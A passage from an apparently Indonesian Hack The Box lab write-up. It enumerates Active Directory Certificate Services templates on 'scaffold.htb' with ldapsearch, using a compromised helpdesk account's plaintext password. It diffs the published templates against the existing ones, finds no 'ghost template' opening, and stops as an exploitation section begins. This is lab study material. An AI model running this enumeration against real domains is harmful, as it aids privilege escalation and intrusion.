...
```shell
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://scaffold.htb -D 'j.harris@scaffold.htb' -w 'Harr1sHelpdesk2026!Breach' -E pr=500/noprompt -b "CN=Configuration,DC=scaffold,DC=htb" "(objectClass=pKIEnrollmentService)" certificateTemplates | grep 'certificateTemplates:' | sed 's/certificateTemplates\: //g' | sort -u | tee enable_ca_template.txt
```
![](Attachments/Pasted%20image%2020260911142825.png)

Cek certifikate yang ada di AD
```shell
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://scaffold.htb -D 'j.harris@scaffold.htb' -w 'Harr1sHelpdesk2026!Breach' -E pr=500/noprompt -b "CN=Configuration,DC=scaffold,DC=htb" "(objectClass=pKICertificateTemplate)" cn | grep 'cn:' | sed 's/cn\: //g' | sort -u | tee available_ca_template.txt
```
![](Attachments/Pasted%20image%2020260911143429.png)

cek template yang tidak ada menggunakan diff
```shell
diff available_ca_template.txt enable_ca_template.txt 
```
![](Attachments/Pasted%20image%2020260911143941.png)

tidak vulnerable ghost template
![](Attachments/Pasted%20image%2020260917134012.png)
# 2. Exploitasi
## a. Create OID
Cek OID yang ada
```shell
